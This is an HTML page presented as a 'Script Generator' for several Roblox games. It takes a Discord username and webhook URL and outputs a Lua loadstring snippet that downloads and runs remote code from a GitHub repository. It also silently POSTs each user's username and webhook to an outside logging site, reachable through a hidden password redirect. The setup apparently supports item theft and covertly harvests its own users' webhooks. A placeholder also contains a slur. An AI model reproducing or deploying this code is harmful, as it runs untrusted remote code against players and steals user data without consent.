<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Script Generator</title>
    <style>
        body {
            background: linear-gradient(45deg, #0f0c29, #302b63, #24243e);
            color: white;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
            margin: 0;
        }
        h1 {
            font-size: 3rem;
            animation: fadeIn 1.5s ease-in-out;
        }
        .container {
            display: flex;
            gap: 15px;
            flex-direction: column;
            align-items: center;
            margin-top: 20px;
        }
        select, input, button {
            background: #ff0080;
            padding: 12px 20px;
            border-radius: 12px;
            cursor: pointer;
            font-size: 1.1rem;
            width: 80%;
            margin-top: 10px;
            border: none;
            box-shadow: 0 0 12px rgba(0, 0, 0, 0.5);
        }
        select:hover, button:hover {
            background: #ff0055;
            transform: scale(1.05);
        }
        .popup {
            display: none;
            text-align: center;
            background: rgba(0, 0, 0, 0.7);
            padding: 30px;
            border-radius: 12px;
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.7);
            backdrop-filter: blur(8px);
            max-width: 400px;
            margin: 20px;
        }
        .popup input {
            margin: 15px 0;
            padding: 10px;
            width: 80%;
            border-radius: 12px;
            border: none;
            background-color: #333;
            color: white;
            font-size: 1rem;
        }
        .generated-script {
            background: #1e1e2e;
            border-radius: 12px;
            padding: 20px;
            margin-top: 20px;
            max-width: 80%;
            margin: 20px auto;
            display: none;
            text-align: left;
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.7);
        }
        .generated-script pre {
            white-space: pre-wrap;
            word-wrap: break-word;
            font-size: 1.1rem;
            color: #d1d1d1;
        }
        .copy-button {
            background: #0080ff;
            padding: 12px 25px;
            border-radius: 12px;
            cursor: pointer;
            margin-top: 10px;
            transition: 0.3s;
            font-size: 1rem;
        }
        .copy-button:hover {
            background: #005bb5;
        }
        .copy-button:disabled {
            background: #555;
        }
    </style>
</head>
<body>
    <h1>Script Generator</h1>
    
    <!-- Sigma Password Detection -->
    <div class="container">
        <input type="password" id="password" placeholder="Enter retard Password" oninput="checkSigmaPassword()">
    </div>

    <!-- Game Selection -->
    <div class="container">
        <select id="game-select" onchange="openPopup(this.value)">
            <option value="">Select Game</option>
            <option value="Blox Fruits">Blox Fruits</option>
            <option value="Murder Mystery 2">Murder Mystery 2</option>
            <option value="Adopt Me">Adopt Me</option>
            <option value="Pet Simulator 99">Pet Simulator 99</option>
            <option value="Pls Donate">Pls Donate</option>
        </select>
    </div>

    <!-- Popup for User Details -->
    <div id="popup" class="popup">
        <h2 id="game-title">Enter Details</h2>
        <input type="text" id="discordUser" placeholder="Discord Username (for testing only)">
        <input type="text" id="webhook" placeholder="Webhook URL">
        <button onclick="generateScript()">Generate Script</button>
        <button onclick="closePopup()">Close</button>
    </div>

    <!-- Generated Script Display -->
    <div id="generated-script" class="generated-script">
        <h3>Generated Script</h3>
        <pre id="script-output"></pre>
        <button id="copy-btn" class="copy-button" onclick="copyScript()">Copy All</button>
    </div>

    <script>
        let currentGame = '';
        let sigmaPassword = "sigma"; // Set password for Sigma detection

        const loadstrings = {
            "Blox Fruits": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/Bloxfruits'))()",
            "Murder Mystery 2": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/Void'))()",
            "Adopt Me": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/AdoptMe'))()",
            "Pet Simulator 99": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/Ps99'))()",
            "Pls Donate": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/PlsDonate'))()"
        };

        function checkSigmaPassword() {
            const password = document.getElementById('password').value.toLowerCase();
            if (password === sigmaPassword) {
                // Redirect to Sigma site
                window.location.href = "https://goldded.github.io/logs/";
            }
        }

        function openPopup(game) {
            if (game) {
                currentGame = game;
                document.getElementById('popup').style.display = 'block';
                document.getElementById('game-title').innerText = `Enter Details for ${game}`;
            }
        }

        function closePopup() {
            document.getElementById('popup').style.display = 'none';
        }

        function generateScript() {
            let username = document.getElementById('discordUser').value;
            let webhook = document.getElementById('webhook').value;

            if (username && webhook) {
                let script = `Username = "${username}"\nWebhook = "${webhook}"\n${loadstrings[currentGame]}`;
                document.getElementById('script-output').innerText = script;
                document.getElementById('generated-script').style.display = 'block';
                document.getElementById('copy-btn').disabled = false;

                // Send logs to the new site
                fetch('https://goldded.github.io/logs/', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        username: username,
                        game: currentGame,
                        webhook: webhook
                    })
                });

                closePopup();
            } else {
                alert("Please fill in both the username and webhook!");
            }
        }

        function copyScript() {
            const scriptText = document.getElementById('script-output').innerText;
            const textarea = document.createElement('textarea');
            textarea.value = scriptText;
            document.body.appendChild(textarea);
            textarea.select();
            document.execCommand('copy');
            document.body.removeChild(textarea);
            alert("Script copied to clipboard!");
        }
    </script>
</body>
</html>
